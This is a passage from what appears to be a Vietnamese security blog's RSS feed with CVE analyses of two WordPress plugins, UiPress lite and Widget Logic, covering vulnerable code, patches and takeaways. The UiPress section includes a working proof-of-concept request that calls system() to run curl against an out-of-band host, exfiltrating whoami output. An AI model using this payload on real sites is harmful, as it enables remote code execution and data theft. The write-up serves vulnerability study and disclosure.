&lt;code&gt;uip_process_form_input()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;POST /wp-admin/admin-ajax.php...action=uip_process_form_input&amp;#34;] --&amp;gt; B[&amp;#34;WordPress gọi uip_process_form_input()&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;Ajax::check_referer()&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;$data = json_decode(formData)&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;$userFunction = sanitize_text_field(userFunction)&amp;#34;]&#xA;E --&amp;gt; F{&amp;#34;function_exists($userFunction)?&amp;#34;}&#xA;F --&amp;gt;|Yes| G[&amp;#34;$userFunction($data)&amp;#34;]&#xA;F --&amp;gt;|No| H[&amp;#34;Ajax::error()&amp;#34;]&#xA;G --&amp;gt; I[&amp;#34;wp_send_json(success)&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Đăng nhập với user &lt;strong&gt;Subcriber&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Lấy security từ response&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-01-cve-2025-3053/security.png&#34; title=&#34;Giá trị security&#34; data-thumbnail=&#34;/posts/2025-12-01-cve-2025-3053/security.png&#34; data-sub-html=&#34;&lt;h2&gt;Security value&lt;/h2&gt;&lt;p&gt;Giá trị security&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-01-cve-2025-3053/security.png&#39; alt=&#34;Security value&#34; height=&#34;637&#34; width=&#34;1485&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Giá trị security&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Gửi request chứa payload:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;action=uip_process_form_input&amp;amp;security=65c1a4e801&amp;amp;formData=&amp;#34;curl&amp;#43;http://1aclwhon6rw1l1bj569pxpkjqaw1ks8h.oastify.com?leadked=$(whoami)&amp;#34;&amp;amp;userFunction=system&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-01-cve-2025-3053/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2025-12-01-cve-2025-3053/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-01-cve-2025-3053/result.png&#39; alt=&#34;Result&#34; height=&#34;579&#34; width=&#34;1049&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2025-3053&lt;/strong&gt; xuất phát từ việc &lt;code&gt;uip_process_form_input()&lt;/code&gt; cho phép người dùng kiểm soát trực tiếp &lt;strong&gt;tên hàm được thực thi&lt;/strong&gt; thông qua &lt;code&gt;userFunction&lt;/code&gt;, chỉ kiểm tra bằng &lt;code&gt;function_exists()&lt;/code&gt; và &lt;strong&gt;không có capability check hay whitelist&lt;/strong&gt;. Điều này khiến người dùng đã xác thực ở mức thấp (Subscriber) có thể thực hiện &lt;strong&gt;Arbitrary Function Call&lt;/strong&gt;, dẫn tới &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;. Phiên bản &lt;strong&gt;3.5.08&lt;/strong&gt; đã khắc phục bằng cách vô hiệu hóa hoàn toàn cơ chế này.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Không cho phép user kiểm soát &lt;strong&gt;dynamic function call&lt;/strong&gt; nếu không có whitelist.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;nonce&lt;/code&gt; / &lt;code&gt;check_ajax_referer()&lt;/code&gt; &lt;strong&gt;không thay thế&lt;/strong&gt; cho &lt;code&gt;current_user_can()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;function_exists()&lt;/code&gt; &lt;strong&gt;không phải cơ chế bảo mật&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Lỗi logic nguy hiểm hơn sanitize sai dữ liệu.&lt;/li&gt;&#xA;&lt;li&gt;Luôn áp dụng nguyên tắc &lt;strong&gt;least privilege&lt;/strong&gt; cho các AJAX endpoint.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/uipress-lite/vulnerability/wordpress-uipress-lite-plugin-3-5-07-authenticated-subscriber-remote-code-execution-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress UiPress lite Plugin &amp;lt;= 3.5.07 is vulnerable to Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-32222 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-30-cve-2025-32222/</link>
      <pubDate>Sun, 30 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-30-cve-2025-32222/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-30-cve-2025-32222/app.jpg&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;Improper Control of Generation of Code (&amp;lsquo;Code Injection&amp;rsquo;)&lt;/strong&gt; trong Widgetlogic.org &lt;strong&gt;Widget Logic (widget-logic)&lt;/strong&gt; cho phép &lt;strong&gt;Code Injection&lt;/strong&gt;. Vấn đề này ảnh hưởng tới Widget Logic từ phiên bản &lt;strong&gt;n/a đến &amp;lt;= 6.0.5&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-32222&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-32222&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 6.0.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 6.0.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/widget-logic/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Widget Logic Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Widget Logic&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;6.0.5&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;6.0.6&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phiên bản lỗi (v6.0.5):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function widget_logic_check_logic($logic)&#xA;{&#xA;    $logic = @trim((string) $logic);&#xA;    $logic = apply_filters(&amp;#34;widget_logic_eval_override&amp;#34;, $logic);&#xA;&#xA;    if (is_bool($logic)) {&#xA;        return $logic;&#xA;    }&#xA;&#xA;    if ($logic === &amp;#39;&amp;#39;) {&#xA;        return true;&#xA;    }&#xA;&#xA;    if (stristr($logic, &amp;#39;return&amp;#39;) === false) {&#xA;        $logic = &amp;#39;return (&amp;#39; . html_entity_decode($logic, ENT_COMPAT | ENT_HTML401 | ENT_QUOTES) . &amp;#39;);&amp;#39;;&#xA;    }&#xA;&#xA;    set_error_handler(&amp;#39;widget_logic_error_handler&amp;#39;); // phpcs:ignore -- we have mode for debugging for admins&#xA;&#xA;    try {&#xA;        $show_widget = eval ($logic); // @codingStandardsIgnoreLine - widget can&amp;#39;t work without eval&#xA;    } catch (Error $e) {&#xA;        trigger_error($e-&amp;gt;getMessage(), E_USER_WARNING); // @codingStandardsIgnoreLine - message is not dependent on user input&#xA;&#xA;        $show_widget = false;&#xA;    }&#xA;&#xA;    restore_error_handler();&#xA;&#xA;    return $show_widget;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;widget_logic_check_logic()&lt;/code&gt; sử dụng &lt;code&gt;eval()&lt;/code&gt; để thực thi trực tiếp chuỗi logic do người dùng cung cấp, không giới hạn hàm nào được gọi. Nếu chuỗi logic không chứa từ khóa &lt;code&gt;return&lt;/code&gt;, hàm sẽ tự động bọc nó thành một câu lệnh &lt;code&gt;return(...)&lt;/code&gt; để đảm bảo biểu thức luôn hợp lệ khi &lt;code&gt;eval()&lt;/code&gt; thực thi. Cơ chế này giúp người dùng chỉ cần nhập biểu thức điều kiện đơn giản, nhưng đồng thời cũng biến mọi input của người dùng thành mã PHP hoàn chỉnh, làm tăng nguy cơ &lt;strong&gt;thực thi mã tùy ý (RCE)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản vá (v6.0.6):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function widget_logic_check_logic($logic)&#xA;{&#xA;    $allowed_functions = array(&#xA;        &amp;#39;is_home&amp;#39;, &amp;#39;is_front_page&amp;#39;, &amp;#39;is_single&amp;#39;, &amp;#39;is_page&amp;#39;, &amp;#39;is_category&amp;#39;,&#xA;        &amp;#39;is_tag&amp;#39;, &amp;#39;is_archive&amp;#39;, &amp;#39;is_search&amp;#39;, &amp;#39;is_404&amp;#39;, &amp;#39;is_user_logged_in&amp;#39;,&#xA;        &amp;#39;current_user_can&amp;#39;, &amp;#39;is_active_sidebar&amp;#39;, &amp;#39;is_admin&amp;#39;,&#xA;    );&#xA;&#xA;    $allowed_functions = apply_filters(&amp;#39;widget_logic_allowed_functions&amp;#39;, $allowed_functions);&#xA;&#xA;    $logic = trim((string) $logic);&#xA;    if (&amp;#39;&amp;#39; === $logic) {&#xA;        return true;&#xA;    }&#xA;&#xA;    // Set up error handling&#xA;    set_error_handler(&amp;#39;widget_logic_error_handler&amp;#39;, E_WARNING | E_USER_WARNING);  // @codingStandardsIgnoreLine - we need this for error handling&#xA;&#xA;    try {&#xA;        // Tokenize the logic string&#xA;        $tokens = widget_logic_tokenize($logic);&#xA;&#xA;        // Parse and evaluate the expression&#xA;        $pos = 0;&#xA;        $result = widget_logic_parse_expression($tokens, $pos, $allowed_functions);&#xA;&#xA;        // Check if there are any unexpected tokens after the expression&#xA;        if ($pos &amp;lt; count($tokens)) {&#xA;            throw new Exception(esc_html__(&amp;#39;Widget Logic: Unexpected tokens after expression.&amp;#39;, &amp;#39;widget-logic&amp;#39;));&#xA;        }&#xA;&#xA;        return (bool)$result;&#xA;    } catch (Exception $e) {&#xA;        widget_logic_error_handler(E_USER_WARNING, $e-&amp;gt;getMessage());&#xA;        return false;&#xA;    } finally {&#xA;        restore_error_handler();&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-30-cve-2025-32222/diff.png&#34; title=&#34;Sự thay đổi của bản vá&#34; data-thumbnail=&#34;/posts/2025-11-30-cve-2025-32222/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Sự thay đổi của bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-30-cve-2025-32222/diff.png&#39; alt=&#34;Diff&#34; height=&#34;876&#34; width=&#34;1899&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Sự thay đổi của bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Bản vá đã loại bỏ &lt;code&gt;eval()&lt;/code&gt;, thay bằng &lt;strong&gt;tokenizer và parser&lt;/strong&gt; để đánh giá logic, chỉ cho phép các hàm trong danh sách &lt;strong&gt;whitelist&lt;/strong&gt;. Nó kiểm tra cú pháp, phát hiện token dư, xử lý lỗi bằng &lt;code&gt;try/catch/finally&lt;/code&gt;, từ đó &lt;strong&gt;tăng cường bảo mật&lt;/strong&gt; và đảm bảo logic widget vẫn hoạt động bình thường.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký một filter hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_filter(&amp;#39;render_block&amp;#39;, &amp;#39;widget_logic_block_render&amp;#39;, 10, 2);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;render_block&lt;/code&gt;: hook filter của WordPress, được gọi mỗi khi một block (Gutenberg block) được render. Tức khi post/page được tạo, plugin sẽ can thiệp vào quá trình render block với callback &lt;code&gt;widget_logic_block_render&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function widget_logic_block_render($block_content, $block)&#xA;{&#xA;    if (!isset($block[&amp;#39;attrs&amp;#39;][&amp;#39;widgetLogic&amp;#39;])) {&#xA;        return $block_content;&#xA;    }&#xA;&#xA;    return widget_logic_check_logic($block[&amp;#39;attrs&amp;#39;][&amp;#39;widgetLogic&amp;#39;]) ? $block_content : &amp;#39;&amp;#39;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;widget_logic_block_render&lt;/code&gt; sẽ kiểm tra nếu block không có attribute &lt;code&gt;widgetLogic&lt;/code&gt;, nó sẽ hiển thị bình thường. Attribute này được thêm vào thông qua &lt;strong&gt;Advanced Option&lt;/strong&gt; khi thêm block.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-30-cve-2025-32222/widget.png&#34; title=&#34;Widget Logic trong Advanced Option&#34; data-thumbnail=&#34;/posts/2025-11-30-cve-2025-32222/widget.png&#34; data-sub-html=&#34;&lt;h2&gt;Widget&lt;/h2&gt;&lt;p&gt;Widget Logic trong Advanced Option&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-30-cve-2025-32222/widget.png&#39; 